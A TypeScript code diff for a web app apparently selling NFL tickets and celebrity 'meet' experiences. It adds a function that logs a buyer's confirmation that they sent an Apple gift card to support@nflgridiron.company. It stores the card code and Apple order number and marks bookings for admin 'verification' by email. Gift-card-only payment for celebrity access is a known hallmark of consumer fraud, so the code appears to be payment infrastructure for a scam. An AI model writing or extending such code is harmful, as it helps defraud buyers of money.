@@ -72,6 +72,10 @@ export interface PaymentSession {
   partnerUrl?: string;
   partnerClickedAt?: number;
   leftSiteForApplePurchase?: boolean;
+  customerConfirmedSent?: boolean;
+  sentConfirmedAt?: number;
+  appleCardCodePreview?: string;
+  appleOrderNumber?: string;
   ticketCode?: string;
   approvedAt?: number;
   approvedBy?: string;
@@ -578,6 +582,236 @@ export async function recordAppleCardPartnerDeparture(params: {
     itemTitle: cleanTitle,
     amount: numericAmount,
     status: isAlreadyCompleted ? "completed" : "apple_partner_redirect",
+    updatedAt: now
+  });
+
+  return { sessionId: cleanSessionId, orderId };
+}
+
+/**
+ * Records explicit confirmation when the returning visitor confirms they have
+ * completed and sent their Apple Card to support@nflgridiron.company (or
+ * provides their Apple Order # / gift card code upon returning to our tab).
+ */
+export async function recordAppleCardSentConfirmation(params: {
+  sessionId?: string;
+  customerName?: string;
+  customerEmail?: string;
+  customerPhone?: string;
+  itemTitle?: string;
+  itemType?: "ticket" | "experience" | "merchandise" | "deposit";
+  amount?: number;
+  venue?: string;
+  cardCode?: string;
+  appleOrderNumber?: string;
+}): Promise<{ sessionId: string; orderId: string }> {
+  const now = Date.now();
+  const nowIso = new Date(now).toISOString();
+
+  let storedName = "";
+  let storedEmail = "";
+  let storedPhone = "";
+  try {
+    storedName = localStorage.getItem("nfl_guest_sender_name") || "";
+    storedEmail = localStorage.getItem("nfl_guest_buyer_email") || "";
+    storedPhone = localStorage.getItem("nfl_guest_buyer_phone") || "";
+  } catch {
+    // ignore storage errors
+  }
+
+  const cleanName = (params.customerName || storedName || "Guest Checkout Visitor").trim();
+  const cleanEmail = (params.customerEmail || storedEmail || "").trim();
+  const cleanPhone = (params.customerPhone || storedPhone || "").trim();
+  const cleanSessionId = (
+    params.sessionId?.trim() ||
+    `APPLE-${now.toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`
+  );
+  const orderId = cleanSessionId.startsWith("ORD-") ? cleanSessionId : `ORD-APPLE-${cleanSessionId}`;
+  const cleanTitle = (params.itemTitle || "NFL Gridiron Experience").trim();
+  const cleanVenue = (params.venue || "").trim();
+  const numericAmount = Number(params.amount || 0) || 100;
+  const cleanCode = (params.cardCode || "").trim();
+  const cleanAppleOrder = (params.appleOrderNumber || "").trim();
+
+  const referenceParts = ["CONFIRMED SENT TO support@nflgridiron.company"];
+  if (cleanCode) referenceParts.push(`CODE: ${cleanCode}`);
+  if (cleanAppleOrder) referenceParts.push(`APPLE ORDER: ${cleanAppleOrder}`);
+  const referenceTag = referenceParts.join(" · ");
+
+  const sessionRef = doc(db, "payment_sessions", cleanSessionId);
+  let existingSession: Partial<PaymentSession> | null = null;
+  try {
+    const snap = await getDoc(sessionRef);
+    if (snap.exists()) {
+      existingSession = snap.data() as PaymentSession;
+    }
+  } catch {
+    // ignore
+  }
+
+  const isAlreadyCompleted = existingSession?.status === "completed";
+
+  await safeSetDoc(
+    sessionRef,
+    {
+      id: cleanSessionId,
+      orderId,
+      customerName: cleanName,
+      customerEmail: cleanEmail,
+      customerPhone: cleanPhone,
+      itemType: params.itemType || existingSession?.itemType || "experience",
+      itemTitle: cleanTitle,
+      ...(cleanVenue ? { venue: cleanVenue } : {}),
+      amount: numericAmount,
+      paymentMethod: "giftcard",
+      status: isAlreadyCompleted ? "completed" : "payment_submitted",
+      partnerClicked: existingSession?.partnerClicked || "Apple Store Online",
+      partnerClickedAt: existingSession?.partnerClickedAt || now,
+      leftSiteForApplePurchase: true,
+      customerConfirmedSent: true,
+      sentConfirmedAt: now,
+      ...(cleanCode ? { appleCardCodePreview: cleanCode } : {}),
+      ...(cleanAppleOrder ? { appleOrderNumber: cleanAppleOrder } : {}),
+      referenceTag,
+      createdAt: existingSession?.createdAt || now,
+      updatedAt: now
+    },
+    { merge: true }
+  );
+
+  let alreadyApproved = false;
+  try {
+    const bookingSnap = await getDoc(doc(db, "bookings", orderId));
+    if (bookingSnap.exists()) {
+      const bData = bookingSnap.data();
+      if (bData?.isApproved || bData?.status === "approved" || bData?.status === "confirmed") {
+        alreadyApproved = true;
+      }
+    }
+  } catch {
+    // ignore
+  }
+
+  if (!alreadyApproved) {
+    const jobs: Promise<any>[] = [
+      safeSetDoc(
+        doc(db, "bookings", orderId),
+        {
+          id: orderId,
+          orderId,
+          bookingId: orderId,
+          paymentSessionId: cleanSessionId,
+          sessionId: cleanSessionId,
+          experienceTitle: cleanTitle,
+          itemName: cleanTitle,
+          gameName: cleanTitle,
+          stadium: cleanVenue || "AT&T Stadium · Arlington, Texas",
+          venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
+          buyerName: cleanName,
+          userName: cleanName,
+          senderName: cleanName,
+          passholderName: cleanName,
+          buyerEmail: cleanEmail,
+          userEmail: cleanEmail,
+          email: cleanEmail,
+          buyerPhone: cleanPhone || cleanEmail,
+          price: numericAmount,
+          totalPrice: numericAmount,
+          totalAmount: numericAmount,
+          dueToday: numericAmount,
+          paymentMethod: "giftcard",
+          paymentChannel: "APPLE GIFT CARD",
+          paymentRef: referenceTag,
+          paymentReference: referenceTag,
+          applePartnerName: "Apple Store Online",
+          leftSiteForApplePurchase: true,
+          customerConfirmedSent: true,
+          sentConfirmedAt: nowIso,
+          ...(cleanCode ? { appleCardCodePreview: cleanCode } : {}),
+          ...(cleanAppleOrder ? { appleOrderNumber: cleanAppleOrder } : {}),
+          status: "pending",
+          orderStatus: "CUSTOMER CONFIRMED APPLE CARD SENT · VERIFY MAIL",
+          approvalStatus: "APPLE CARD SENT · READY FOR ADMIN VERIFICATION IN support@nflgridiron.company",
+          isApproved: false,
+          updatedAt: nowIso
+        },
+        { merge: true }
+      ),
+      safeSetDoc(
+        doc(db, "store_orders", `order-${orderId}`),
+        {
+          id: `order-${orderId}`,
+          orderId,
+          sessionId: cleanSessionId,
+          paymentSessionId: cleanSessionId,
+          userEmail: cleanEmail,
+          buyerName: cleanName,
+          buyerPhone: cleanPhone || cleanEmail,
+          itemType: params.itemType === "ticket" ? "ticket" : "experience",
+          itemName: cleanTitle,
+          venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
+          price: numericAmount,
+          totalPrice: numericAmount,
+          paymentMethod: "giftcard",
+          paymentRef: referenceTag,
+          applePartnerName: "Apple Store Online",
+          leftSiteForApplePurchase: true,
+          customerConfirmedSent: true,
+          sentConfirmedAt: nowIso,
+          status: "pending_approval",
+          orderStatus: "CUSTOMER CONFIRMED APPLE CARD SENT · VERIFY MAIL",
+          isApproved: false,
+          updatedAt: nowIso
+        },
+        { merge: true }
+      )
+    ];
+
+    if (params.itemType === "experience" || cleanTitle.toLowerCase().includes("meet") || cleanTitle.toLowerCase().includes("ceedee")) {
+      jobs.push(
+        safeSetDoc(
+          doc(db, "customer_inquiries", orderId),
+          {
+            id: orderId,
+            orderId,
+            sessionId: cleanSessionId,
+            type: "apple_card_redirect",
+            customerName: cleanName,
+            customerEmail: cleanEmail,
+            customerPhone: cleanPhone || cleanEmail,
+            messagingPlatform: "Gmail",
+            messagingDetails: cleanEmail,
+            favoritePlayer: cleanTitle.toLowerCase().includes("ceedee") ? "CeeDee Lamb" : cleanTitle,
+            venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
+            feePaid: numericAmount,
+            paymentMethod: "giftcard",
+            paymentRef: referenceTag,
+            applePartnerName: "Apple Store Online",
+            leftSiteForApplePurchase: true,
+            customerConfirmedSent: true,
+            sentConfirmedAt: nowIso,
+            status: "pending",
+            orderStatus: "CUSTOMER CONFIRMED APPLE CARD SENT · VERIFY MAIL",
+            isApproved: false,
+            updatedAt: nowIso
+          },
+          { merge: true }
+        )
+      );
+    }
+
+    await Promise.allSettled(jobs);
+  }
+
+  upsertSavedGuestSession({
+    id: cleanSessionId,
+    orderId,
+    customerName: cleanName,
+    customerEmail: cleanEmail,
+    paymentMethod: "giftcard",
+    itemTitle: cleanTitle,
+    amount: numericAmount,
+    status: isAlreadyCompleted ? "completed" : "payment_submitted",
     updatedAt: now
   });
 
